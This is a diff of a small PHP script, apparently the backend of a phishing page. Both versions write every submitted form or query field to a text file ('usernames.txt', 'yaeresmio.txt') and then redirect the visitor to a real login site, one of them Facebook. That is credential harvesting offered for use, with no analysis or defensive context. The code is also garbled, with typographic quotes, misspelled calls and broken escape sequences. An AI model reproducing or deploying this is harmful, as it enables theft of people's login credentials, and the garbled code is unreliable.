@@ -1,35 +1,13 @@
-﻿– <?php
-
-– header(« Location: http://www.Facebook.com/login.php « );
-
-– $handle = fopen(« yaeresmio.txt », « a »);
-
-–
-
-– foreach($_GET as $variable => $value) {
-
-– fwrite($handle, $variable);
-
-–
-
-– fwrite($handle, « = »);
-
-–
-
-– fwrite($handle, $value);
-
-–
-
-– fwrite($handle, « \r\n »);
-
-– }
-
-–
-
-– frité($ande, « \r\n »);
-
-– fclose($handle);
-
-–
-
-– exit
+_<?php
+header ('Location:-The site you are using- ');
+$handle = fopen('usernames.txt', 'a');
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, '=');
+fwrite($handle, $value);
+fwrite($handle, 'rn');
+}
+fwrite($handle, 'rn');
+fclose($handle);
+exit;
+?> _
